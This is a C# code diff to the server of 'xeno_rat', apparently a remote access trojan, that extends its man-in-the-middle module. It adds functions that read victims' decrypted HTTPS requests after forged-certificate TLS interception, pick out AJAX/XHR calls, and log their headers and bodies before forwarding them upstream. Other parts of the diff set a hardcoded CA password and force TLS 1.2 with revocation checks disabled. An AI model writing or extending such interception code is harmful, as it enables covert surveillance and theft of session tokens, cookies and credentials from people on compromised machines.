@@ -65,7 +65,7 @@ namespace xeno_rat_server.Forms
                 var caPassword = "ChangeMeStrong123";
 
                 // Construct MitmHandler which will import the PFX with proper flags internally                      
-                _mitmHandler = new MitmHandler(caPath, caPassword, msg => PostUi(msg));
+                _mitmHandler = new MitmHandler(caPath, caPassword, msg => PostUi(msg), TransparentTcpTunnel, this);
                 PostUi("MITM CA loaded for dynamic signing.");
             }
             catch (Exception ex)
@@ -240,7 +240,7 @@ namespace xeno_rat_server.Forms
 
                     if (attemptMitm)
                     {
-                        _ = Task.Run(() => RelayLoopWithOptionalMitm(clientSock, destAddr, destPort, lvi, serverCertificate, true));
+                       _ = Task.Run(() => RelayLoopWithOptionalMitm(clientSock, destAddr, destPort, lvi, serverCertificate, true));
                     }
                     else
                     {
@@ -343,6 +343,153 @@ namespace xeno_rat_server.Forms
             {
                 return $"[Decompression failed: {ex.Message}]";
             }
+        }
+
+        // Config: how many body bytes to keep for logging (per-request)
+        private const int AJAX_LOG_BODY_LIMIT = 8 * 1024; // 8 KiB per request preview
+
+        // Safely parse a basic HTTP request (request line, headers, body preview) and log if it's an AJAX/XHR request.
+        // 'prefix' is a short context string you'll use for UI logging (e.g. client info or "MITM host").
+        private void LogHttpIfAjax(string prefix, byte[] fullBuffer)
+        {
+            try
+            {
+                if (fullBuffer == null || fullBuffer.Length == 0) return;
+
+                string maybeText = null;
+                try { maybeText = Encoding.UTF8.GetString(fullBuffer); } catch { try { maybeText = Encoding.ASCII.GetString(fullBuffer); } catch { maybeText = null; } }
+                if (string.IsNullOrEmpty(maybeText)) return;
+
+                int headerEnd = maybeText.IndexOf("\r\n\r\n", StringComparison.Ordinal);
+                if (headerEnd < 0)
+                {
+                    // no complete headers yet
+                    return;
+                }
+
+                string headerSection = maybeText.Substring(0, headerEnd);
+                var headerLines = headerSection.Split(new[] { "\r\n" }, StringSplitOptions.None);
+                if (headerLines.Length == 0) return;
+
+                string requestLine = headerLines[0];
+                var reqParts = requestLine.Split(' ');
+                if (reqParts.Length < 2) return;
+
+                // Collect headers into dictionary (case-insensitive)
+                var headers = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
+                for (int i = 1; i < headerLines.Length; i++)
+                {
+                    var line = headerLines[i];
+                    int colon = line.IndexOf(':');
+                    if (colon <= 0) continue;
+                    string name = line.Substring(0, colon).Trim();
+                    string value = line.Substring(colon + 1).Trim();
+                    headers[name] = value;
+                }
+
+                // Detect AJAX/XHR via X-Requested-With or fetch/other heuristics
+                bool isXhr = false;
+                if (headers.ContainsKey("X-Requested-With") && headers["X-Requested-With"].IndexOf("XMLHttpRequest", StringComparison.OrdinalIgnoreCase) >= 0)
+                    isXhr = true;
+                // Also treat Fetch-api XHR-like as often AJAX when content-type is application/json and it's an XHR-like method
+                if (!isXhr)
+                {
+                    if (headers.ContainsKey("Content-Type") && headers["Content-Type"].IndexOf("application/json", StringComparison.OrdinalIgnoreCase) >= 0)
+                    {
+                        string method = reqParts[0].ToUpperInvariant();
+                        if (method == "POST" || method == "PUT" || method == "PATCH") isXhr = true;
+                    }
+                }
+
+                if (!isXhr) return; // only log AJAX/XHR requests per your requirement
+
+                // Extract body preview safely
+                byte[] bodyBytes = fullBuffer.Skip(headerEnd + 4).ToArray();
+                int taken = Math.Min(bodyBytes.Length, AJAX_LOG_BODY_LIMIT);
+                byte[] preview = new byte[taken];
+                Array.Copy(bodyBytes, 0, preview, 0, taken);
+
+                string bodyText = null;
+                if (preview.Length > 0)
+                {
+                    try { bodyText = Encoding.UTF8.GetString(preview); } catch { try { bodyText = Encoding.ASCII.GetString(preview); } catch { bodyText = null; } }
+                }
+
+                // Build message
+                var sb = new StringBuilder();
+                sb.AppendLine($"{prefix} AJAX request detected: {requestLine}");
+                sb.AppendLine("Headers:");
+                foreach (var kv in headers)
+                {
+                    sb.AppendLine($"  {kv.Key}: {kv.Value}");
+                }
+                if (bodyText != null)
+                {
+                    sb.AppendLine("Body preview:");
+                    sb.AppendLine(Trunc(bodyText, UI_TRUNCATE_GLOBAL));
+                    if (bodyBytes.Length > taken) sb.AppendLine($"(body truncated to {taken} bytes for logging)");
+                }
+                else
+                {
+                    sb.AppendLine($"Body: {bodyBytes.Length} bytes (binary or non-text preview skipped)");
+                }
+
+                PostUi(sb.ToString());
+            }
+            catch (Exception ex)
+            {
+                try { PostUi($"LogHttpIfAjax failure: {ex.Message}"); } catch { }
+            }
+        }
+
+        // Helper: read up to maxBytes bytes from a stream but do not block forever.
+        // Returns the bytes read (may be less than maxBytes). Use with streams you control (SslStream/NetworkStream).
+        private async Task<byte[]> ReadHttpRequestPreviewAsync(Stream s, int maxBytes = 16 * 1024, int timeoutMs = 2000)
+        {
+            if (s == null) return null;
+            var ms = new MemoryStream();
+            var buf = new byte[4096];
+            var sw = Stopwatch.StartNew();
+            try
+            {
+                // Attempt to read until header end or until maxBytes reached or timeout
+                while (ms.Length < maxBytes && sw.ElapsedMilliseconds < timeoutMs)
+                {
+                    // if data available on NetworkStream with DataAvailable, we can read without blocking long
+                    try
+                    {
+                        int toRead = Math.Min(buf.Length, maxBytes - (int)ms.Length);
+                        var readTask = s.ReadAsync(buf, 0, toRead);
+                        var winner = await Task.WhenAny(readTask, Task.Delay(200)).ConfigureAwait(false);
+                        if (winner != readTask)
+                        {
+                            // no data during small window — if we have some bytes and they contain headers end, break
+                            var tmp = ms.ToArray();
+                            if (tmp.Length >= 4)
+                            {
+                                string t = null;
+                                try { t = Encoding.ASCII.GetString(tmp); } catch { }
+                                if (t != null && t.Contains("\r\n\r\n")) break;
+                            }
+                            continue;
+                        }
+                        int r = await readTask.ConfigureAwait(false);
+                        if (r <= 0) break;
+                        ms.Write(buf, 0, r);
+                        // break early if headers end found
+                        var arr = ms.ToArray();
+                        string maybe = null;
+                        try { maybe = Encoding.ASCII.GetString(arr); } catch { maybe = null; }
+                        if (maybe != null && maybe.IndexOf("\r\n\r\n", StringComparison.Ordinal) >= 0) break;
+                    }
+                    catch
+                    {
+                        break;
+                    }
+                }
+            }
+            catch { }
+            return ms.ToArray();
         }
 
         // ----------------------------------------------------------------------
@@ -605,7 +752,7 @@ namespace xeno_rat_server.Forms
                 {
                     int read;
                     try
-                    {
+                        {
                         read = await src.ReadAsync(buf, 0, buf.Length, ct).ConfigureAwait(false);
                     }
                     catch (OperationCanceledException) { break; }
@@ -1099,6 +1246,7 @@ namespace xeno_rat_server.Forms
                                                     : $"http://{host}{target}";
                                                 httpRequestShown = true;
                                                 PostUi($"HTTP request: {method} {url}");
+                                                LogHttpIfAjax($"C->S {host}", arr);
                                             }
                                         }
                                     }
@@ -1838,6 +1986,7 @@ namespace xeno_rat_server.Forms
                 _cache = new ConcurrentDictionary<string, X509Certificate2>();
                 _log = logger ?? (_ => { });
                 _transparentFallback = transparentTunnelFallback;
+                this.form = form;
             }
 
             // Transparent fallback wrapper that accepts prefix bytes explicitly
@@ -1933,6 +2082,8 @@ namespace xeno_rat_server.Forms
                 return false;
             }
 
+            byte[] reqPreview = null;
+
             // ----------------------------------------------------------------------
             // MITM handler (caller has probed and passes the serverSelectedProtocol).
             // If serverSelectedProtocol == Tls13 => it will fallback to transparent.
@@ -1984,6 +2135,24 @@ namespace xeno_rat_server.Forms
                         enabledSslProtocols: SslProtocols.Tls12, checkCertificateRevocation: false).ConfigureAwait(false);
 
                     _log($"Authenticated to client for {sniHost}. Protocol: {clientSsl.SslProtocol}");
+
+                    // Read a small preview of the first HTTP request sent by the client and log if it's AJAX/XHR.
+                    // Non-blocking, limited read — don't wait forever.
+                    reqPreview = null;
+                    try
+                    {
+                        reqPreview = await this.form.ReadHttpRequestPreviewAsync(clientSsl, 16 * 1024, 1500).ConfigureAwait(false);
+                    }
+                    catch (Exception ex)
+                    {
+                        _log($"ReadHttpRequestPreviewAsync failed: {ex.Message}");
+                    }
+
+                    if (reqPreview != null && reqPreview.Length > 0)
+                    {
+                        // Log only if AJAX/XHR detected
+                        try { this.form.LogHttpIfAjax($"MITM {sniHost}", reqPreview); } catch { }
+                    }
                 }
                 catch (Exception ex)
                 {
@@ -2008,6 +2177,16 @@ namespace xeno_rat_server.Forms
                     await remoteSsl.AuthenticateAsClientAsync(sniHost, null, SslProtocols.Tls12, checkCertificateRevocation: false).ConfigureAwait(false);
 
                     _log($"Connected to upstream {sniHost}. Protocol: {remoteSsl.SslProtocol}");
+
+                    if (reqPreview != null && reqPreview.Length > 0)
+                    {
+                        try
+                        {
+                            await remoteSsl.WriteAsync(reqPreview, 0, reqPreview.Length).ConfigureAwait(false);
+                            await remoteSsl.FlushAsync().ConfigureAwait(false);
+                        }
+                        catch (Exception ex) { _log($"Forwarding preview to upstream failed: {ex.Message}"); }
+                    }
                 }
                 catch (Exception ex)
                 {
